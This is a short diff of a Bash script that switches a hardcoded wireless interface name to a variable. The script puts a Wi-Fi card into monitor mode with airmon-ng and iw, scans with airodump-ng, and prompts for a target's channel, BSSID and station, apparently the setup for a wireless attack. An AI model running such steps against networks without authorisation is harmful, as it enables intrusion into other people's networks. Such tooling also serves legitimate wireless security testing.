@@ -4,12 +4,12 @@ read z
 sudo airmon-ng check kill
 sudo airmon-ng check kill
 sudo ip link set $z down
-sudo iw dev wlx984827de9e5f set type monitor
+sudo iw dev $z set type monitor
 sudo ip link set $z up
 sudo timeout 60 airodump-ng $z # you can change the time if required
 echo "enter channel number of the target:"
 read a
-sudo iwconfig wlx984827de9e5f channel $a
+sudo iwconfig $z channel $a
 echo "enter targets BSSID:"
 read b
 echo "enter targets STATION:"
